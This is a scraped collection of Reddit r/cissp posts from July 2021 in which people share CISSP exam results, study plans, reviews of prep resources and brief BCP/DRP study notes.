* CISSprep.net: I was hesitant on buying this… just because I am cheap, and the mixed opinions… I personally enjoyed this platform, the questions were a headache, yes…grammar mistakes, some complained about not knowing single or multiple answer options…whatever, if you’re worried about that… you’re head is not in the right place. Pass the exam, make your own prep engine that is grammatically correct with explicit instructions of SELECT ONE....….(end rant on CISSprep). Scores ranging from 50-80%.... my overall average score was 65.8%.. I tracked my scores throughout the process... OCD, sometimes, more of a moral booster....
* Pocketprep App: This was an awesome resource for me because of convenience. Can be taken on your phone or table! Definitely helps nail down the factual items to build the conceptual knowledge you need.
* ISC2 Official Study App: Again, great resource due to convenience! Great supplemental method of doing questions to keep your mind on topics along with Pocketprep.
* rSlades blog post on ISC2: [Practice Questions - (ISC)² Community (isc2.org)](https://community.isc2.org/t5/Exams/Practice-Questions/td-p/18626?fbclid=IwAR138lfLPSzBL90njFDCi6Xe0j-wUXT7i1I4nw8iS3rs33HyV-P_tMlzU_0). These were awesome, another source of questions with explanations (sometimes collaboration from viewers)

Notecards:

*   I made note cards for basic topics, processes, procedures, and concepts I knew I needed to have in an instance… maybe 50-75 notecards total, I did them every day before work, and every night before bed….things such as: SDLC, BCP, DRP, BIA, SOC reports, Security Models, Incident Response, RMF, RAID, Backup Types/Benefits, SAML, ISC2 Cannons, Cryptography. More or less things I knew I needed to nail down, processes/steps, and random things I just always have a hard time committing to memory. 

Anyways, yeah…. I am humbled, overwhelmed, and gracious to join the ranks of fellow CISSPs! Thanks to all for continuously keeping this thread alive (daily), I lied in wait for a while taking notes on peoples prep methods, inputs, etc. and here I am! Thanks to all those on here I reached out to with questions/advice! Now I am going to enjoy the month I have left before back to the educational grind in the evenings!

Good luck!",2021-07-20

1940,onz36q,Passed (1 hour ago :D) 1st Try 100 Questions,"In the words of Colin Weaver ""Hey all you CISSP wanabees""

I just got back from my exam and all my thoughts are fresh in my mind so I thought I could share them with this group.

**My Background**

I've been in Cyber Security for just over 5 years. I work for a fortune 500. I'm a manager for a team that works on data security: DLP, DRM, Insider Threat.

**How I studied**

I started studying in late September or early October of last year. I went through the official study guide. I read through the entire book and took notes as I went. I used the online test bank that comes with the book and was going through. I was studying maybe 1 hour a day and usually 2-3h/day on weekends. Around Christmas I got burned out and then picked it back up around the end of January.

Then I went through the Destination Certification videos. I was getting about 80% on my Sybex practice exams and I felt good. Sybex also has online flashcards which helped too. At this point I was studying a minimum 2 hours per day. I went to book my exam and saw that the testing facility had filled up and I couldn't take my exam for another 2 months. (This pushed me into May and the updated course.)

With my extra time to study and to prepare for the updated course I watch Mike Chapple's Stuff on LinkedIn Learning. I'm not sure I would recommend the course, I can't remember a single topic I retained from his class. He did cover some topics for the new exam but he presented in a really dry way. I was watching at 1.25 speed the entire time. I also downloaded Anki, a flashcard program which was one of my best tools. Someone has uploaded some free practice questions that you can search for. I also just started adding terms and topics I needed to study harder. When I would go through an exam and get something wrong I would add that as a card. I have reviewed flashcards everyday since May.

With one last weekend before my exam, I bought some extra practice exams to study. I bought CISSP Exam Prep and the Udamy course. I took the Udamy exam and got a 40% three days before my exam date. Let's just say I was a bit concerned. I started taking the CISSP Exam Prep exams and I was getting 50%-60%. I freaked out and after some discussions with my fiancé decided to pay the $50 and reschedule for July.

I wanted to study seriously for the next two months with my extra time. I started by going through Kelly Handerhan's course. Her course was really good for what it covered but it doesn't cover all topics. Then I started going through the CISSP Exam Prep practice exams every other day. Then on the other day I would review other materials. I reviewed the Sybex book again. I read the 11th hour book (I wouldn't recommend it). I did IT Dojo Questions of the day, these were good when I was burned out from doing other things. I also studied my flashcard every day. At this point I was probably studying 2.5 hours everyday. I would also do Boson exams to get ready and identify gaps in my knowledge.

Yesterday, I reviewed my flashcards and then meditated a lot to calm my nerves. I watched Kelly Handerhan's why you will pass the CISSP exam. I had 3-4 questions where this video directly helped me.

**The Exam**

I expected the exam to be less technical than Boson and CISSP Exam Prep. It was. It was more straightforward knowledge based than I expected. I was expecting more experience questions but most of the questions were around a specific piece of information from the CBK. I kept hearing ‘think like a manager’, but I felt like there were more knowledge based questions. They weren't trying to trick you as much as I was expecting. I felt like I was very prepared with what I had learned and studied. Once I got into the exam it wasn't as bad as I was expecting. I felt okay about a lot of questions. In the last 10 questions, the questions got easier and I ended right at 100.

**What I recommend**

Reading the Sybex book was painful but had to be done. I think after that I would have done a visual refresher like Destination Certification. Using Boson and CISSP Exams, but using them to learn, not killing yourself on the score you get. You can't get a 40% and expect to pass but don't worry if you are getting a 66% vs a 70%. These exams are way more technical and complexly worded than the real exam. They help you prepare for the mindset of being able to pick apart a question. For example, if you see a question about control implementation, you better make sure you know if they want a preventive control, a detective control, an administrative control, or a technical control. That’s the mindset you need to have. Flashcards are a must for cementing topics in your head. I highly recommend Anki. I didn’t do a bootcamp but looking back I should have asked my company to buy me one. 

I don’t recommend the Udamy exam. It was overly confusing and just intentionally difficult. Some of the questions I was just mad at and would roll my eyes at why they said the answer I chose was wrong. 

Booking the exam well in advance is important. I didn’t realize that it would fill up. I checked once and they had openings every wednesday. Then I went to schedule my exam, and it was full for the next two months.

If I was doing it again, I think I could have shortened my study time, if I had done the practice exams earlier. I had relied a lot on the Sybex exams and thought those would be enough but they weren’t for me, they gave me a false sense of security. 

**Content Refresh**

I know a lot of people want to know how different the content is for the new exam. I do think I got a couple questions on new content but it was topics that I was familiar with through my work so it wasn’t very difficult.

**Overall**

Keep studying, keep working, keep your faith. Good luck everyone!",2021-07-20
1941,onxvll,Provisionnally passed @100 questions,"Hi,

Just wanted to share my feedback after passing provisionnally.

&#x200B;

**About me**

* About 10 years experience in IT Audit, GRC, CISO. Not really a tech guy.
* I registered 2 years ago, had zero motivation to study and rescheduled it. Then covid arrived and I had to reschedule two more times...

&#x200B;

**Preparation**

1. Eleventh Hour CISSP - I did not open at all the official guide, but I have read twice this smaller book. Very good starter for lazy people like me.
2. CISSP Official Practice Tests - Did all questions and looked on internet to understand when I was wrong. Resources I used the most.
3. PocketPrep (IT & Security) - Very good to test your knowledge with direct questions to use during transports. Not too technical and not too expensive. I did all questions.
4. Random website ([http://luc.desfosses.fr/CISSP/](http://luc.desfosses.fr/CISSP/)) - I do not remember where I found it, probably on reddit, but this has been a good summary of key concepts. I also wrote on paper the key concepts (OSI, ports, security models, SOC, BCP, ...).
5. 2021 Exam change - As I took a very long time to get the motivation to start studying, the content has changed in May so I looked to the changes on this website [https://www.cybervista.net/cissp-may-2021-exam-update/](https://www.cybervista.net/cissp-may-2021-exam-update/)

I hesitated a lot to buy Boson questions after reading this reddit, but I also looked at many feedbacks here saying that Boson questions were too technical compared to the exam so I did not buy. And to be honest I think that knowing more technical details would not have helped at all. At least I saved some money.

&#x200B;

**Exam**

* As most of people here I was not very confident that I would succeed during the test. I thought I would go to 150 questions but it ended at 100...
* You really need the high level view of what is used for what (concepts). You do not need to bother learning by heart every technical details of everything.
* Work experience helped a lot, although I am not a tech guy I review lots of risk analysis and the mindset is similar.

&#x200B;

1942,onvy9p,Average score on practice tests,"For those of you who have passed the CISSP already, what was your average score on practice tests you completed?  Debating if I wait to take the exam until I’m consistently scoring 80-90%",2021-07-20
1943,onsqur,Study Partner/Study Group?,"Hello everyone. I am currently studying for the CISSP exam with my test date set for September 17th. I have been in the Info Sec world for a little over 4 years as a security generalist for 2 medium-large companies (technical title is Security Engineer but it's more a combo of engineering/analyst work/compliance stuff - basically whatever needs to be done).

I have read in various posts that having a study partner or being in a study group is a helpful tool, but I'm not quite sure what that entails - regular group study sessions? IMing each other questions? Having someone to console you when you realize your brain is too small to retain any knowledge??

My current study plan is:

1. **July 8 - Jul 30:** Self-Study with Mike Chapple Linked-In Course. Review with Pocket Prep app. Take test quizzes/exams on CISSPrep after finishing course videos.
2. **Aug 2 - 6:** TIA CISSP Bootcamp
3. **Aug 9 - September 15:** Review Bootcamp notes, Create Flashcards, More CISSPrep, Read Official Study Guide Cover to Cover (the book comes with my bootcamp), Do Practice material in Official Study Guide
4. **September 16:** sacrifice goat
5. **September 17:** PROFIT?

**I don't know if this is enough.** If feel so unprepared even though i have only been watching the course and taking notes for a little over a week. For my previous 2 certs (Sec+ and GCED) I just took a bootcamp, studied a little, took a few practice tests and I was ready to go. Had no issues with either exam. But I am dreading this one. 

So I'm wondering if adding a study buddy/study group will help me feel less...stupid? Or at least help me to know if I'm way off base with my learning.

1948,on293l,"Passed and certified, here are my thoughts.","Hey everyone, as the title states I provisionally passed my CISSP exam at the end of June and was fully certified by (ISC)² three weeks later. I delayed making a post to formulate my thoughts regarding the entire experience.  This post is kind of long, TLDR at the bottom. 

Initially I reviewed this subreddit to get a grasp of where to begin, though I will admit I didn’t follow the suggested study plan.  I studied lightly on/off for 3 months and diligently for 2 months. Make sure in the lead up you take time for yourself. If you begin feeling burnt, stop for a while.  Play some games, go for a run, or talk with a friend about non CISSP stuff. Studying through fatigue will only hurt you. 

For background I have 5 years direct information security work experience and a graduate level degree. 

Books
- CISSP All-in-One Exam Guide, Eighth Edition, 8th Edition - Rating: 8/10
- Sybex (ISC)² CISSP Certified Information Systems Security Professional Official Study Guide, 8th Edition - Rating: 10/10

The AIO helped me get into the right mindset regarding the exam. The dialogue referenced many real world applications of the concepts. 
The Sybex book was by far the best study resource for exam preparation.  It covered everything necessary for exam prep. 
When I encountered a topic or concept in either book I was unsure about (even slightly) I transcribed the definition or section verbatim into a spiral using a pencil (tactile feedback)

Practice Exams
- (ISC)² CISSP Certified Information Systems Security Professional Official Practice Tests (online bank included with the book) - Rating: 9/10
- Boson - Rating: 2/10
- Pocket prep (free 30 questions)- Rating: 3/10

The official practice tests online were invaluable for isolating the areas I had deficiencies in. Additionally, the flash cards were great for quick studying throughout the day. 
The Boson test bank was large, though in my opinion the program was clunky and the questions were not as useful as reviews I had read made them out to be. I didn’t use the Boson tests in the final stretch of my study. It may work for you, though I suggest trying the official practice tests (included in the official guide package) before shelling out money to Boson. 
PocketPrep was great for quick study when I was waiting in lines or had a spare moment. I didn’t purchase the full version as I had already purchased the Boson bank. 
Overall, the practice tests were nice to prepare me for timing on the exam and identifying deficient areas, though they are not reflective of the exam itself. As difficult as it may be, don’t put too much stock in the practice exam scores, instead use the data to focus your study efforts. I really dug my heels into practice exams in the final few days before the exam and found myself doing worse and burning myself out.  Much like the books I hand transcribed the answers to questions I got wrong and flagged them. 

Audio/Video
- CISSP, 2nd Edition Sari Greene - Rating: 7/10
- Destination Certification (YouTube) - Rating: 4/10
- Eleventh Hour CISSP Study Guide (Audible) - Rating: 10/10

Sari Green is great. The videos were encouraging and the knowledge tests assisted in recalling useful information. I will admit I didn’t finish the series as it wasn’t as in depth as the official study guide. 
The Destination Certification YouTube series was nice for background study and reference, though for me it was more of a feel good effort. Some of the graphics assisted me in mentally categorizing information. 
Eleventh Hour was fantastic. I snagged it on Audible in the final two weeks of study, listened to it at 1.25 speed while working out or cleaning and would make notes on my phone of topics I wanted to review in depth. This resource often highlighted information that I gleaned over in the books.

Endorsement Process
Once I passed, I created my account and submitted my application. There are no CISSP’s that I work with so I opted to have (ISC)² sponsor me. 2.5 weeks after submitting my application (ISC)² stated they needed additional verification of my work history. Unfortunately my place of employment refused to write/provide a letter of affirmation regarding work history and directed me to a third-party service. I provided the information to (ISC)² and received feedback that they will not interact with a third-party. (ISC)² then stated they were going to audit my application. I won’t lie to you all, this stressed my out after having read some horror stories on this subreddit. 
Nearly out of options, I provided tax documents (with sensitive information redacted) and unofficial transcripts. The next day I got a notification that my application was accepted and I could pay my membership fee.  

Overall, it was a lot of study and felt daunting at times. Take it a topic at a time, write things down, and take breaks! Good luck everyone!

TLDR: The Official (ISC)² study materials are S-tier, don’t stress over practice exam scores, take breaks and separate when you get tired.",2021-07-19

I'm currently studying for CISSP too, with my current experience also to meet the experience for all these certifications. What roles I should apply?

Before everyone ask questions like what would you like to become and why did you choose all these certifications? 

I've picked these certifications to learn the theoretical knowledge in cyber security overall which I did massively I must say and now I'd like to know which roles are great to apply and get the practical experience.

I'm still figuring out what do I want to become in cyber security specifically but I'm enjoying being IAM analyst for now.

Any help/advice would be much appreciated.

Thanks all.",2021-07-18

1952,omj3yq,7/10/21 Fail at 150 questions,"Sigh. Here I am writing the post I never wanted to write. I went for it on 7/10/21 and didn’t pass. Hoping to help others and get a little advice on the next steps to take. 

Per my previous post [here](https://www.reddit.com/r/cissp/comments/oexlqz/cue_the_panic_5_days_until_exam_date/?utm_source=share&utm_medium=web2x&context=3), I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. I'd been studying off and on for a little over a year, four consecutive months of intense study, and utilized the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I’d also taken a 10-week boot camp class three times.

I knew there were topics I didn’t have down 100% but felt I *probably* knew enough to get me by. When I sat down at the computer to take my exam, I knew I was in trouble 20 questions in. The questions looked so foreign and vague. I read and reread and reread every question, breaking the sentence down by word, looking for some semblance of anything I’d seen before. I couldn’t make sense of any of it. I had anticipated this since that’s what everyone says but that didn’t cushion the shock.

I went all the way to 150 questions. I saw a lot of questions on SDLC, at least five questions on SOC compliance and a few on DRP/BCP. Nothing super technical with the exception of a few IPSec and tunneling protocol questions. Nothing on Kerberos, nothing on OSI. Out of all 150, I felt confident I knew the answer on maybe 5 questions. 

What’s really crazy is that I had “think like a manager; don’t DO anything” tattooed on the inside of brain going in. But none of the questions, nor any of the answers, within my exam were structured that way or provided answers that were that high-level. I’m not a technical person so it’s not my instinct to “fix” anything. There weren’t any “weeds” to get into. The questions weren’t super technical but they most definitely weren’t high-level. Somewhere in between, if that makes sense. 

I was below proficiency in four domains, near proficiency in three, and above in one domain. Interestingly, the domains I’d considered my weak domains while studying were my strongest, and my strong domains were “below proficiency.”

So now I’m trying to decide what to do: whether to give it another go or maybe try another certification like Security+ to help build up my confidence. There’s a real big part of me that wants to keep going and build onto the momentum I had and try again in 60-90 days. There’s another smaller part of me that wants to walk away from it completely and get my life back again and enjoy the rest of my summer.

Any advice, opinions, feedback? Should I try again or go for Security+? Is this just too big an elephant to eat for a non-technical professional?",2021-07-18

1954,om95hn,BCP/DRP Quick Notes,"Some general BCP/DRP notes I had lying around if it helps anyone:

At a high-level, the most important thing to remember is that a BCP/DRP program has two main objectives: the first one is to preserve human life, to keep the human heart beating.  Second is one of the corners of the CIA Triad: availability.  Much like the human heart, the second high-level objective is to keep the lights blinking and systems online.

The topic of proper business continuity and disaster recovery planning is **highly testable**.

BCP process and steps (Not specifics, just the general flow)

* Components of the Business Impact Analysis (ARO, MTTR, MTBF, SLE)
* The idea that all stakeholders of a BCP should be involved in the planning
* Business continuation strategies
* The importance of documentation

**Here are some important concepts to remember**:

* The process of recovering an organization's critical business functions after a disaster is known as BCP
* Dealing with a more immediate or specific emergency is known as DRP.
* Difference between BCP and DRP
* BCP is more high-level than DRP.  DRP falls under the umbrella of BCP.
* ""What if our main data center was destroyed by an earthquake, what do we do?"" - That's BCP.
* ""What if our firewall failed at our main data center, what do we do?"" - That's DRP.
* The start of any organization's DRP/BCP program must have the approval of the senior management team
* Management's approval is also a show of their support
* BCP/DRP is all about documentation, documentation, documentation
* According to the CISSP, the first thing to look for in a disaster is the proper documentation that contains procedures and guidelines on how to deal with a disaster
* As with all things CISSP, keep the BCP/DRP document alive with regular updates.  Changes to the organization's governance, infrastructure, or an addition of a new technology should be reflected in the BCP/DRP.  Users and executives alike should also accumulate a certain level of training, education, and security awareness to contribute to a strong BCP/DRP program.

**Here are some types of disasters**:

* Man-made
* Negligence
* Warfare
* Fires
* Terrorism
* Insider threat
* Cyber attack
* Natural
* Flood
* Earthquake
* Tornado
* Tsunami

**The basic steps of a sound BCP are**:

* Phase 1: Scope and Initiation
* Phase 2: Business Impact Analysis
* Phase 3: Recovery Strategies and Continuity Development
* Phase 4: Implementation and Testing
* Phase 5: Maintenance

**RTO vs RPO vs MTTF vs MTTR**

RTO is the maximum amount of time that is needed to bring critical business functions back to normal operating status before that business is crushed.

RPO is the measure of at what point in time a business can go back and still salvage enough data to fully operate.  For example, can a business lose all the data it has accumulated in the last 10 minutes and still operate as a business? Probably.  But can it lose all the data it has accumulated in a 12 hour period and still function? This depends on the type of business.  A company that deals with the stock market and money, probably has a really short RPO, compared to a school with a database of past test scores, which could have a longer RPO.

MTTF as we stated is the same thing as MTBF.  It is the measure of how long something is supposed to operate before failure.

MTTR is the amount of time required that is necessary to bring a critical business function back to operation.  The mean time to recovery for your 2nd monitor in a dual monitor setup can probably be 72 hours to a week before you start finding it necessary to have a 2nd monitor again.  The mean time to recovery for your mouse is probably a lot shorter, maybe minutes to hours?

1960,ol29bu,Provisional Pass,"Hey ladies and gents,

I took the test yesterday just out of whim. I'm a network administrator with 8 years experience. I honestly think that Security+ was harder than the CISSP exam and I think that could be attributed to the large body of knowledge and question pool that usually comes with CompTIA exams. I'm at the tail end of a Cybersecurity degree so maybe that helped out but I just went in to the test with a ""ain't nothing to it but to do it"" attitude. The body of knowledge illustrated by ISC2 is crucial to planning out how you need to study if you have prior knowledge of the field. I think my networking experience helped out too. The toughest part for us technical folks I believe would be moving away from our traditional thought process when it comes to solving problems. There are going to be multiple choices that feel like the right answer but it's all about management mentality that'll help find the ""most"" right answer. CBT nuggets helped as a sort of passive learning tool just by being able to put it on while I'm driving too and from work. For everyone else wishing to pursue this certificate I wish you all the luck!",2021-07-15

**About Me** - 9 years of experience in IT Audits, Risk and Compliance, and conducting Security Assessments. Studied for close to 6 months.

**Preparation**:
 * This subreddit - Honestly I would not have passed if it wasn't for you guys. All the resources I used below (except the OSG) I found out through all of you.   
 * OSG 8th edition - very comprehensive but I think one of the best resources.   
 * Kelly Handherhan's course on Cybrary - Her delivery and teaching style cements concepts into your brain.   
 * Destination Certification Mindmap videos and CISSP CRAM on Youtube - Very useful for reinforcements. Highly recommend watching these 1 or 2 weeks before the exam   
 * CISSPprep.net - This one was amazing. I felt the real exam questions were similar to the questions here. It was frustrating because I was scoring only 60% on an average but helped me a lot in identifying my weak areas.  
 * Eric Conrad 11th Hour CISSP - Unpopular opinion but this didn't work for me.   
 * Official practice tests 2nd edition - Make sure to read the reasons for why something was right or wasn't right.  
 * Kelly Handerhan - why you will pass the CISSP - cannot recommend this enough.   

**The Exam**: Can't say anything that hasn't been said before. Most of the questions I could boil it down to two options, some questions were direct. I honestly thought I failed. Do not bother memorizing anything. I made sure I read each question 2-3 times and put on my manager hat.

1973,oi6439,Passed - 2'nd Attempt,"All, 

Would just like to give my 2 cents since I passed the exam yesterday and previously posted in this forum about failing this exam in February.  Honestly, it was heartbreaking back then and I didn't even know if I wanted to go through the process again.  I somehow found the motivation to give it one more try and I passed yesterday with literally seconds left at 120+ questions.  I thought for sure I would fail or that I'd run out of time as the questions kept coming in. 

The exam is an absolute beast and I don't think any amount of studying will fully prepare you for this thing.  Even on the second attempt, I felt complete beaten up by the test and saw things that I saw no where within the study materials.  I'd estimate I studied over 250+ hours combining from the first test. 

I honestly can't say anything that you don't already know.  You need to study the normal materials, but you also just need to have the right mindset.  Thinking like a manager is easy to say, but I'm just not sure how much that carries on this test when you're going through it.  I'd say my best advice is don't worry about knowing specific definitions, but knowing exactly how everything works in a real world setting is much more important. 

Also I went with the approach of reading the question multiple times and even purposely slowed down on questions I knew the answer.  I don't think this is a good approach considering I literally had seconds left with potentially a LOT of questions left if the exam was to continue.

After around 15-20 questions I started to develop the feeling that I will surely fail the exam.  Like many of you said in past no test bank will prepare you for the actual exam questions. They are worded differently and make you feel tempted to click the wrong answer, be sure to read the question multiple times. There were questions where i purely guessed the answer as I never read those topics in my life. I was mentally exhausted and was preparing for the worst and after 100 question the test stopped.  I went to the front and received the result and to my surprise i passed, i couldn't hold my excitement and shouted a big YEESSSSSSSS.

1975,ohxoha,Passed today - was certain I didnt!,"First - I'm making this post because reading everyone elses helped me a LOT. So, Reddit = 10/10

Second - I'm an idiot, I don't learn fast, and this shit was hard to study for. If you are reading this you are smarter than I am - you will pass this.

The exam was brutal. 20 questions in and I'm already mentally preparing to fail. The test stopped at 100Q and I would have bet $100 it was because I couldn't mathematically pass with more Qs. I shit bricks when I saw the Congrats. So here my biggest takeaways -

I used very few resources

\- the 2018 official guide and matching practice exam book(has 1000+ Q's, get this!),

\-the Syngress 3rd edition study guide and the Syngress 11th hr book (same authors)

\- Boson practice tests.

\-Thats it.  No new material studied for the updated exam - not needed!

Here's what I did

\- read every book, cover to cover, and highlighted the important concepts /facts.  If any of the material puts information in an outlined box - that's not extra info, its stuff you REALLY need to know.

\-Practice tests. Do as many as you can, find your weak domains, go back to the books and skim through your highlights, and take more tests.  Do NOT memorize the answers to your practice test, I promise this is a sure way to fail.

&#x200B;

* Key to passing- Answer your practice question correctly, then explain to yourself \*why\* the question was correct.  I didn't come across a single question on the real exam that resembled anything close to the 2000+ practice questions I took, but understanding why you chose the practice question answer is the secret sauce.

1978,oh9f9h,"Passed at 100 questions, ~2 weeks of study, 7 years IS experience","
Got sort of voluntold to get this by EOY about a month ago. Did the Training Camp bootcamp (I do not recommended, more below) last week as I had a “free” week between engagements. Hadn’t done anything at all prior to that week. Exam was not yet scheduled at the start of bootcamp. A couple days into the class one opened up for today, so I grabbed it. 
I’ll just say that the timing with this PrintNightmare… nightmare could not have been worse.

I did the bootcamp (Monday-Saturday morning).
Did nothing on Sunday.
Did a few practice tests Monday (holiday)
Tuesday actually got some real studying with notes and everything!
Wednesday all hell broke loose with the PrintNightmare patch and that sort of took over the rest of the week for me. My study time turned into very short (10-15 question) practice tests when I could grab a few minutes during the workday, then did the real ones (100-150) after hours. 
Exam was this afternoon, Friday, and I can’t wait to actually sleep tonight. 

I passed at 100 questions and I have no idea what the time was.
I was just as surprised how confident I was with many of the questions as I was with how many I stared at and second guessed for probably far too long. 

Study materials:
- Training Camp Bootcamp - I chose the virtual classroom option, not knowing that it was actually a hybrid class and I’d basically just be sitting on mute watching a live class with no real interaction. The instructor I had elected not to use the ISC2 training materials provided his own stuff, which he had not yet updated for the new CBK. There were some other issues, but those was the main ones. 
- CISSPrep - I literally got an account last night after seeing someone on here mention that their practice tests are hard. I wish I’d known about that sooner, probably would have passed on Training Camp, or any live training, entirely. 

Practice exams:
- CISSPrep - I found these to be the best. They’re hard, and it can be discouraging to do poorly. I found that the questions forced me to think the right way. Feedback on missed questions is both great and can be incredibly frustrating because if you miss a “not tricky” one it forces you to go look it up yourself and you actually LEARN.
- Sybex (latest version of the book, online question bank, and the app) - these were ok. The online bank and the app didn’t sync well, so I kept getting repeat questions despite toggling that setting off. It could stand to give better feedback on missed questions. 
- PocketPrep - Found it useful for short quizzes. Probably could have gone without this one but that’s ok. I liked being able to see the user average.
- CCCure - This was way more frustrating than it was helpful. I guess they let others contribute to their test bank to have it be like the real question pool where you’ll encounter questions written in different ways, but after awhile you start to be able to pick out questions by author, especially the bad ones, and there are bad ones. And with that comes a lot of inconsistency in answer explanation. Definitely could have gone without this one, and it was the most expensive by more than double. It was also recommended by the TC instructor but that’s neither here nor there.

1981,oh3qjj,"Pass @ 100 Questions - 2 weeks of study, 10 years of IS experience (4yrs as CISO)","**And if you're newer to the industry: Even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!**

About 5 years ago I was planning on getting my CISSP, but I got a promotion to a CISO and never felt the need to get it. Fast forward to remote work culture (and a few kids later) and now I'm re-evaluating where I want to be in the future (hint: It's less management and more technical problem solving).

I found this board and noted a few things. One that stood out was the PocketPrep resource. I took a few free practice exams to gauge where I was. Initial tests showed that I was averaging about 60%. I figured with a bit of hard-core ADHD studying, I could get it done. I bought the 8th edition of Shon and read that from cover-to-cover (highlighting all the important pieces) over the course of a week (coffee break? Grab the book. Bathroom break? Grab the book. Every meal? Grab the book).  I subscribed to PocketPrep and after reviewing Shon, I took a few exams. Where I was coming up short, I went back and refreshed on those domains. After burning through the rest of the PocketPrep question bank (with about 3 days to go), I found a question bank from Cybrary/Kaplan ([https://app.cybrary.it/immersive/enrollment/activity/27008376](https://app.cybrary.it/immersive/enrollment/activity/27008376)) and used their bank. After going through those questions, I realized that Shon was a little light in certain areas (despite the fact that it's 1300 pages). If I had more time, I probably would have acquired their referenced source as Shon does did not even reference some of the items found in the Kaplan questions ([https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691](https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691)).

Overall the exam included a lot of ""BEST"" or ""MOST"" answers and as a professional who lives in grey waters, I could constantly hear myself say ""It depends"", but context seemed to always be lacking. I honestly still don't know what the right answer was for most of them as often times it felt as though all 4 were correct, it just depended on your definition of ""BEST"".

At 100 questions/90 minutes I got kicked out. Since I was already borderline when I first took some practice questions, I took that as a good sign.

My job experience:  
4 years CISO (Definitely helped as I've dealt with a lot of this information from OJT and never heard of a lot of it when I was in my engineering roles)  
5 years in Analyst/Engineer Roles  
10 years of various IT/Sysadmin positions  


If you've been in the industry for a while, these questions still suck, but just buckle down for a few weeks-month and press through it. You got this!

And if you're newer to the industry, even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!",2021-07-09

1984,ogv3ld,Passed at 150 Questions and 3 Hours,"Took the exam and passed at 150 questions. I was pleasantly surprised and to be honest I did not expect to read Congratulations on the sheet after I left the testing center. 

One of the weirdest elements of my exam was that it almost felt like the exam was trying to get me to pass. As I passed question 100 I received many questions on concepts that I was most strong in. It really did start to mess with my head because I just assumed that the exam was just feeding me questions to get to 150 as I couldn’t understand how I got the same question on SOC reporting rephrased 5 different ways. 

Studying consisted of:

- Training Camp Boot Camp
- CISSP Exam Cram Youtube Videos
- Study Notes and Theory Test Questions (~200)
- Sybex Test Questions (~300)
- Luke Ahmeds How to Think Like a Manager for the CISSP

Overall i’d say the Exam Cram videos were the best to jog my memory on all the concepts leading up to the Exam. I don’t think I took the conventional study method as I took the Training Camp bootcamp and sat for the exam a few weeks later. I’ll be honest that my exam prep wasn’t the greatest as I only had limited nights and weekends to dedicate. But the week leading up I had 2 full day cram sessions (the day before and the day of the exam). 

Happy to answer any questions you have on the Exam or study materials.

1987,ogfy0o,Passed the CISSP exam last week. Here's how I studied.,"I'll start with a big thank you to everyone that has posted what worked or didn't for them while studying. I gained a lot of insight browsing through numerous posts. I don't have any incredible insights, but below is what I used to pass the exam and hopefully someone can get some use out of it.

Almost all of the sources I used are available for free via O’Reilly/Safari Online if you have a DoD email.

 

Video Courses:

- Cybrary CISSP Video Course [Free]- Kelly Handerhan (15 hours) 
This course does a tremendous job of highlighting all of the major topics in each domain. Provides examples that make concepts relatable and easy to digest.


- CISSP Certification Video Boot Camp [Free w/O'Reilly account] – Thor Pederson (24.5 hours)
Provides a lot of practical examples. Examples are framed in a way that aligns to the “CISSP mindset.”


- CISSP Cert Prep [Free trial via LinkedIn Learning] – Mike Chapple (24 hours)
This was the only source updated for the new version of the exam released in May that I used. This series does a good job covering Domain 3 compared to the other sources.

- CISSP Complete Video Course, Second Edition [Free] – Sari Greene (26 hours)
This course is more formal and in-depth, heavily focuses on practical application of topics (some are not relevant to the exam).

- Mind Map [Free] – YouTube (6.5 hours)
Short and well-produced. They do a good job of summarizing topics within each domain and provide an organized view of the material. It’s a good source for a quick overview of each Domain or as a last minute review.



Text Materials:

- Eleventh Hour CISSP Study Guide [Free with O'Reilly]
Good for an overall introduction to CISSP topics. Some of the topics are dated, so keep that in mind if you use this for review.
 
- (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition [$40]

- “Sunflower” CISSP Summary Version 2.0 [Free]
Wasn't a fan of this, but I did use it as a final review.
 

Practice Exams:

-(ISC)2 CISSP Official Study Guide, 8e [Free if you buy the book]

- CISSP Official (ISC)2 Practice Tests [Free with O'Reilly account]


Misc:

- Why you WILL pass the CISSP – Kelly Handerhan via YouTube
Great job of covering the mindset you need to pass the exam.

- Essential CISSP Exam Guide: 2018 CBK [$14.99] – Audible (17 hours)
The audio quality is not the best, but I found this to be useful when I didn’t have time to sit down and study.

 

My Study Schedule:

I studied over a 3 month period. The first month was largely spent easing into an overview of each domain and trying to establish foundational knowledge to build upon later. During the first month I totaled 62 hours of study, a little over 2 hours per day. The second month was focused on diving deeper into the material, powering through multiple video courses, and taking a couple practice exams to determine where I stood. During the second month I increased my total study hours for the month to 82, averaging approx. 2 hours and 40 minutes per day. I spent the final month reading the official study guide and taking practice exams (I answered approx. 1,500 questions during this period). Overall, I spent 110 hours studying in this final month, averaging a little over 4 hours per day. I increased my study efforts during the final week before the exam, studying 36 hours during the final 7 days. All of this time was spent reviewing and not trying to learn new material.

 

Recap:

Month 1: 62 hours (2 hrs/day) - Intro to each domain
Month 2: 82 hours (2.5 hrs/day) - Deep dives
Month 3: 110 hours (4 hrs/day) - Practice Exams and reviews
 

Final Thoughts:

1. Develop a plan early and stick to it. Use some of the shorter study items to identify your strong and weak domains. Build your study plan around these results.

2. Don’t try to become an expert in your weak domains. Put in the time to become proficient, but don’t ignore the other domains.

3. Learn the logical processes as opposed to memorizing exact steps. Understand how everything fits together instead of memorizing definitions.

4. Remember to approach the test with the appropriate mindset.

5. Practice tests are important to identify knowledge gaps, but don’t try to memorize the answers. Read the explanations and try to understand why each answer is the correct choice.

6. Take a few breaks from studying where you don’t review any CISSP material for a day or two. Especially the day before the exam.

 

TLDR: There is a lot of free material available to those with a DoD email account. Set a goal and stick to it. Take some breaks and find time to relax and have some fun. Spend time reviewing questions on the exam and approach the test with the appropriate mindset. When you get close to your exam date, trust that you've done enough to prepare yourself and take a break the day before. Best of luck!",2021-07-08

My local community college doesn't offer any classes purely focused on the CISSP unfortunately. I already checked there.

I think the bootcamps only benefit me when I've done all the studying I can and it's a cram session before taking the test.

